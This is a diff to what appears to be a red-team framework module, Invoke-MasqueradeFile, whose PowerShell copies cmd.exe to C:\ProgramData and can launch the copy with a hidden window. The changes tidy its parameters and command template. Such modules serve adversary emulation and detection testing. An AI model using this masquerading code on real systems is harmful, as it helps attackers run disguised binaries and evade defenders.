@@ -23,19 +23,20 @@ comments:
 options:
   - name: SourceFile
     description: System file to copy.
-    required: false
+    required: true
     value: 'C:\Windows\System32\cmd.exe'
   - name: DestinationFile
     description: Destination path for the copied file.
-    required: false
+    required: true
     value: 'C:\ProgramData\cmd.exe'
   - name: Execute
-    description: Execute the copied binary (true/false).
+    description: Execute the copied binary.
     required: false
-    value: 'true'
+    value: 'True'
+    strict: true
     suggested_values:
-      - 'true'
-      - 'false'
+      - 'True'
+      - 'False'
   - name: OutputFunction
     description: PowerShell output function to use.
     required: false
@@ -48,7 +49,7 @@ script: |
       param(
           [string]$SourceFile = "C:\Windows\System32\cmd.exe",
           [string]$DestinationFile = "C:\ProgramData\cmd.exe",
-          [string]$Execute = "true"
+          [switch]$Execute
       )
 
       if (-not (Test-Path $SourceFile)) {
@@ -59,7 +60,7 @@ script: |
       Copy-Item $SourceFile -Destination $DestinationFile -Force
       Write-Output "[+] Copied $SourceFile to $DestinationFile"
 
-      if ($Execute.ToLower() -eq "true") {
+      if ($Execute) {
           try {
               $proc = Start-Process -PassThru -FilePath $DestinationFile -WindowStyle Hidden
               Write-Output "[+] Launched $DestinationFile (PID: $($proc.Id))"
@@ -71,6 +72,4 @@ script: |
           }
       }
   }
-script_end: Invoke-MasqueradeFile -SourceFile "{{ SourceFile }}" -DestinationFile
-  "{{ DestinationFile }}" -Execute "{{ Execute }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION
-  }}
+script_end: Invoke-MasqueradeFile {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
